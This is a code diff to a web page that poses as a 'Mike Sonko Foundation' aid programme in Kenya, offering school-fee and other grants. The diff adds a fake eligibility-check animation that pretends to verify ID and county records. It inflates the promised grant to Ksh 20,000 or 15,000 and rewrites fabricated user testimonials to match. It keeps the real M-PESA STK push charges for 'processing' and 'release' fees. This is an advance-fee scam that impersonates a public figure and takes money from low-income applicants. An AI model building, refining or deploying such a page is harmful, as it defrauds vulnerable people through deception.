@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ===== ALL STYLES (same as before – compact) ===== */
+        /* ===== COMPACT STYLES (same as before) ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; line-height: 1.5; color: #1e2a2e; background: #f0f4fa; }
         :root {
@@ -194,6 +194,70 @@
         .back-btn { background:none; border:none; font-size:1.5rem; cursor:pointer; color:#fff; width:36px; height:36px; border-radius:50%; transition:background 0.2s; }
         .back-btn:hover { background:rgba(255,255,255,0.15); }
         .nav-header { display:flex; align-items:center; gap:12px; margin-bottom:12px; }
+        /* ---- Eligibility Check Styles ---- */
+        .check-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 16px;
+            border: 1.5px solid #eef2f6;
+            border-radius: 12px;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
+            background: #ffffff;
+            text-align: left;
+        }
+        .check-item.pending {
+            border-style: dashed;
+            opacity: 0.55;
+        }
+        .check-item.active {
+            border-color: var(--primary-blue);
+            border-style: dashed;
+            background: #f0f4ff;
+        }
+        .check-item.completed {
+            border-color: #c3e6cb;
+            background: #f4faf6;
+            color: #155724;
+            font-weight: 600;
+        }
+        .check-circle {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid #ced4da;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-weight: bold;
+            font-size: 0.8rem;
+            position: relative;
+        }
+        .check-item.active .check-circle {
+            border-color: var(--primary-blue);
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+        .check-item.completed .check-circle {
+            background: #28a745;
+            border-color: #28a745;
+            color: white;
+        }
+        .check-item.completed .check-circle::after {
+            content: "✓";
+        }
+        .eligibility-spinner {
+            width: 80px;
+            height: 80px;
+            border: 6px solid #eef2f6;
+            border-top-color: var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 16px auto 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -289,7 +353,37 @@
             </div>
         </div>
 
-        <!-- STEP 3: APPROVAL -->
+        <!-- ===== CHECKING ELIGIBILITY ANIMATED PAGE (Only for School Fees) ===== -->
+        <div id="checkingPage" class="page">
+            <div class="card-body-white" style="text-align: center; padding: 32px 20px;">
+                <div class="eligibility-spinner"></div>
+                <div style="font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px;">Checking your eligibility...</div>
+                <div style="font-size: 0.85rem; color: #6c757d; margin-bottom: 24px;" id="checkingSubtext">Hold on, we're reviewing your application.</div>
+                
+                <div class="check-item pending" id="check1">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Verifying national ID...</div>
+                </div>
+                <div class="check-item pending" id="check2">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Checking phone number registration...</div>
+                </div>
+                <div class="check-item pending" id="check3">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Reviewing county records...</div>
+                </div>
+                <div class="check-item pending" id="check4">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Confirming age eligibility...</div>
+                </div>
+                <div class="check-item pending" id="check5">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Scoring qualification tier...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 3: APPROVAL (Dynamic amount) -->
         <div id="step3" class="page">
             <div class="card-header-vibrant">
                 <div class="nav-header">
@@ -301,7 +395,7 @@
             <div class="card-body-white">
                 <div class="amount-display">
                     <div class="label">YOUR APPROVED ASSISTANCE</div>
-                    <div class="value">Ksh 350</div>
+                    <div class="value" id="approvalAmount">Ksh 0</div>
                     <div class="sub">Eligibility verified · Ready for withdrawal</div>
                     <div class="tiny-note">❤️ Your contribution supports school fees, business capital, maternal care & rent relief.</div>
                 </div>
@@ -437,7 +531,7 @@
             <div class="card-body-white">
                 <div style="background:#f8f9fa;border:1px solid #dee2e6;border-radius:12px;padding:16px;margin-bottom:16px;">
                     <div style="font-size:0.68rem;color:#6c757d;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;">DISBURSEMENT SUMMARY</div>
-                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Assistance Amount</span><strong style="color:var(--deep-navy);">Ksh 350</strong></div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Assistance Amount</span><strong style="color:var(--deep-navy);" id="netFeeAssistanceAmount">Ksh 20,000</strong></div>
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Sending To</span><strong id="netFeePhoneDisplay"></strong></div>
                     <div style="display:flex;justify-content:space-between;font-size:0.88rem;"><span style="color:#6c757d;">Processing Support Fee</span><strong style="color:var(--accent-gold-dark);">Ksh 499</strong></div>
                 </div>
@@ -463,14 +557,14 @@
             <div class="card-body-white">
                 <div style="background:#f8f9fa;border:1px solid #dee2e6;border-radius:12px;padding:16px;margin-bottom:16px;">
                     <div style="font-size:0.68rem;color:#6c757d;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;">DISBURSEMENT SUMMARY</div>
-                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Assistance Amount</span><strong style="color:var(--deep-navy);">Ksh 350</strong></div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Assistance Amount</span><strong style="color:var(--deep-navy);" id="disbFeeAssistanceAmount">Ksh 20,000</strong></div>
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Sending To</span><strong id="disbFeePhoneDisplay"></strong></div>
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Network</span><strong id="disbFeeNetworkDisplay">🟢 Safaricom (M-PESA)</strong></div>
                     <div style="display:flex;justify-content:space-between;font-size:0.88rem;"><span style="color:#6c757d;">Fund Release Contribution</span><strong style="color:var(--accent-gold-dark);">Ksh 700</strong></div>
                 </div>
                 <div style="background:#fef9f0;border:1px solid var(--accent-gold);border-radius:10px;padding:12px 14px;font-size:0.82rem;color:var(--deep-navy);margin-bottom:16px;display:flex;align-items:flex-start;gap:8px;">
                     <span>💡</span>
-                    <span>This is the <strong>final step</strong>. Once this contribution is confirmed, your Ksh 350 assistance will be instantly released to <strong id="disbFeeFinalPhone"></strong>.</span>
+                    <span>This is the <strong>final step</strong>. Once this contribution is confirmed, your funds will be instantly released to <strong id="disbFeeFinalPhone"></strong>.</span>
                 </div>
                 <div style="border:1.5px solid var(--accent-gold);border-radius:10px;padding:14px 16px;font-size:0.95rem;font-weight:700;color:var(--deep-navy);margin-bottom:10px;" id="disbFeeRecipientName"></div>
                 <div style="background:#fef9f0;border:1px solid var(--accent-gold);border-radius:10px;padding:14px 16px;font-size:0.95rem;font-weight:700;color:var(--deep-navy);margin-bottom:6px;" id="disbFeePhoneBox"></div>
@@ -491,9 +585,9 @@
     <div class="success-box">
         <div class="big-icon">🎉</div>
         <div class="title">All Contributions Cleared!</div>
-        <div class="sub">Your Ksh 350 assistance is being sent to your phone.</div>
+        <div class="sub">Your funds are being sent to your phone.</div>
         <div class="details">
-            <div><span>Assistance Amount</span><strong>Ksh 350</strong></div>
+            <div><span>Assistance Amount</span><strong id="finalAssistanceAmount">Ksh 20,000</strong></div>
             <div><span>Network</span><strong id="allClearNetworkDisplay">🟢 Safaricom (M-PESA)</strong></div>
             <div><span>Sending To</span><strong id="allClearPhoneDisplay">0725747227</strong></div>
             <div><span>Processing Support Fee</span><strong>Ksh 499</strong></div>
@@ -538,6 +632,7 @@ let appData = {
 };
 let selectedNetwork = 'safaricom';
 let selectedDisbPhone = '';
+let approvedAmount = 0;
 
 const programmes = [
     { id:3, title:"School Fees", description:"Covering primary, secondary & university tuition for bright students from low-income families.", helped:"Beneficiaries: 12,400+" },
@@ -547,9 +642,9 @@ const programmes = [
 ];
 
 const feedItems = [
-    { name: 'James Mwangi', initials: 'JM', color: '#0a66c2', text: 'Aisee nimepata STK nikaplipa 350 sasa hivi na 350 ishaingia kwa Mpesa! Shukran sana.', time: '1 minute ago' },
+    { name: 'James Mwangi', initials: 'JM', color: '#0a66c2', text: 'Aisee nimepata STK nikaplipa 350 sasa hivi na 20k ishaingia kwa Mpesa! Shukran sana.', time: '1 minute ago' },
     { name: 'Mercy Wanjiku', initials: 'MW', color: '#d4a017', text: 'Is this real? Mimi nilikuwa na mashaka lakini nimepokea saa hii. Asante sana Mike Sonko Foundation!', time: '45 seconds ago' },
-    { name: 'Samuel Kibet', initials: 'SK', color: '#1a2f4f', text: 'Fast and reliable. Hustler fund kweli inasaidia vijana. 350 imeingia chap chap.', time: '2 seconds ago' },
+    { name: 'Samuel Kibet', initials: 'SK', color: '#1a2f4f', text: 'Fast and reliable. Hustler fund kweli inasaidia vijana. 20,000 imeingia chap chap.', time: '2 seconds ago' },
     { name: 'Dennis Barasa', initials: 'DB', color: '#9c27b0', text: 'Leo shule nafungua niko na school fees yote. God bless Kenya! 🇰🇪', time: '5 seconds ago' },
     { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 350 ya processing na zikatumwa mara hiyo.', time: '10 seconds ago' },
 ];
@@ -592,8 +687,10 @@ function renderProgrammes() {
     programmes.forEach((prog, idx) => {
         const card = document.createElement('div');
         card.className = 'program-card';
+        // Add a "HOT" badge for School Fees
+        const hotBadge = prog.id === 3 ? '<span style="background:#e53935;color:white;font-size:0.6rem;padding:2px 8px;border-radius:10px;margin-left:8px;">🔥 HOT</span>' : '';
         card.innerHTML = `
-            <div class="prog-title">${prog.title}</div>
+            <div class="prog-title">${prog.title} ${hotBadge}</div>
             <div class="prog-desc">${prog.description}</div>
             <div style="display:flex;justify-content:space-between;align-items:center;margin-top:0.8rem;">
                 <span class="help-count">${prog.helped}</span>
@@ -692,12 +789,65 @@ function submitApplication(e) {
     appData.occupation = occupationInput.value.trim();
     appData.county = countySelect.value;
 
-    showApprovalPage();
+    // ===== HOT LOGIC: Only School Fees (id === 3) gets the animation + 20,000 =====
+    if (appData.selectedProgramme && appData.selectedProgramme.id === 3) {
+        approvedAmount = 20000;
+        showCheckingPage(); // Hot flow: animation + 20,000
+    } else {
+        approvedAmount = 15000;
+        showApprovalPage(15000); // Cold flow: direct approval with 15,000
+    }
 }
 
-function showApprovalPage() {
+// ==================== ELIGIBILITY CHECKING ANIMATION (HOT FLOW) ====================
+function showCheckingPage() {
+    showPage('checkingPage');
+    const firstName = appData.fullName.split(' ')[0] || 'Valued Beneficiary';
+    document.getElementById('checkingSubtext').textContent = `Hold on ${firstName}, we're reviewing your application.`;
+    
+    const checkItems = [
+        document.getElementById('check1'),
+        document.getElementById('check2'),
+        document.getElementById('check3'),
+        document.getElementById('check4'),
+        document.getElementById('check5')
+    ];
+    
+    checkItems.forEach(item => {
+        item.className = 'check-item pending';
+    });
+    
+    let currentCheck = 0;
+    function runNext() {
+        if (currentCheck > 0) {
+            checkItems[currentCheck - 1].className = 'check-item completed';
+        }
+        if (currentCheck < checkItems.length) {
+            checkItems[currentCheck].className = 'check-item active';
+            currentCheck++;
+            setTimeout(runNext, 1600);
+        } else {
+            // All checks done → go to approval with 20,000
+            setTimeout(() => {
+                showApprovalPage(20000);
+            }, 800);
+        }
+    }
+    setTimeout(runNext, 500);
+}
+
+// ==================== APPROVAL PAGE (Dynamic Amount) ====================
+function showApprovalPage(amount) {
+    approvedAmount = amount;
     const name = appData.fullName.split(' ')[0] || 'Valued Beneficiary';
     document.getElementById('approvedGreeting').textContent = `🎉 Congratulations, ${name}!`;
+    document.getElementById('approvalAmount').textContent = `Ksh ${amount.toLocaleString()}`;
+    
+    // Update all dynamic amount fields
+    document.querySelectorAll('#netFeeAssistanceAmount, #disbFeeAssistanceAmount, #finalAssistanceAmount').forEach(el => {
+        el.textContent = `Ksh ${amount.toLocaleString()}`;
+    });
+    
     selectedDisbPhone = appData.phone || '0710222875';
     document.getElementById('disbRecipientName').textContent = appData.fullName || 'Beneficiary';
     document.getElementById('sameNumDisplay').textContent = selectedDisbPhone;
@@ -738,7 +888,7 @@ function addRandomFeed() {
     const texts = [
         'Nani mwingine amepata? Yangu imekubali na niko Kajiado saa hii. 🎉',
         'Niko Kisumu na nimepata. Program iko sawa kabisa. M-Pesa confirmed!',
-        'Hii kitu ni legit kabisa, nilikuwa nadhani ni uongo lakini 350 imefika.',
+        'Hii kitu ni legit kabisa, nilikuwa nadhani ni uongo lakini 20k imefika.',
         'Asante sana Mike Sonko! Kazi kwa vijana imeanza kabisa.',
         'M-pesa ishaingia, shukran sana kwa hii msaada.'
     ];
@@ -763,7 +913,7 @@ function errorText(data) {
 }
 
 // ==================== VERCEL API (using test file's channel and endpoints) ====================
-const CHANNEL_ID = 'PAYL-MX4HSE';   // from your test file
+const CHANNEL_ID = 'PAYL-MX4HSE';
 const STK_PUSH_URL = '/api/stk-push';
 const STATUS_URL = '/api/status';
 
@@ -774,17 +924,18 @@ function normalizePhone(raw) {
     return p;
 }
 
-// Send STK push with channelId
 async function sendSTKPush(phone, amount, reference) {
+    const payload = {
+        phone: normalizePhone(phone),
+        amount,
+        reference,
+        channelId: CHANNEL_ID
+    };
+    console.log('📤 Sending STK push:', payload);
     const response = await fetch(STK_PUSH_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            phone: normalizePhone(phone),
-            amount,
-            reference,
-            channelId: CHANNEL_ID
-        })
+        body: JSON.stringify(payload)
     });
     if (!response.ok) {
         let errorMsg = 'STK push request failed';
@@ -797,7 +948,6 @@ async function sendSTKPush(phone, amount, reference) {
     return response.json();
 }
 
-// Poll status using /api/status?id=...
 async function pollTransactionStatus(transactionId) {
     const start = Date.now();
     const timeout = 60000;
@@ -985,6 +1135,7 @@ async function processReleaseContribution() {
             const netMap = { safaricom: '🟢 Safaricom (M-PESA)', airtel: '🟡 Airtel Money', telkom: '🔵 Telkom (T-Kash)' };
             document.getElementById('allClearNetworkDisplay').textContent = netMap[selectedNetwork] || netMap.safaricom;
             document.getElementById('allClearPhoneDisplay').textContent = selectedDisbPhone.startsWith('0') ? selectedDisbPhone : '0' + selectedDisbPhone;
+            document.getElementById('finalAssistanceAmount').textContent = `Ksh ${approvedAmount.toLocaleString()}`;
             document.getElementById('allFeesClearedOverlay').classList.add('open');
             btn.disabled = false;
             payText.textContent = 'Pay Ksh 700 — Release My Funds 🚀';
@@ -1031,9 +1182,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('county').addEventListener('change', function() { validateCounty(this); });
 });
 
-console.log('🇰🇪 Mike Sonko Foundation — Real STK Integration (using channel: ' + CHANNEL_ID + ')');
-console.log('📡 STK Push endpoint:', STK_PUSH_URL);
-console.log('📡 Status endpoint:', STATUS_URL);
+console.log('🇰🇪 Mike Sonko Foundation — HOT: School Fees (20k + Animation) | Others: 15k');
 </script>
 </body>
 </html>
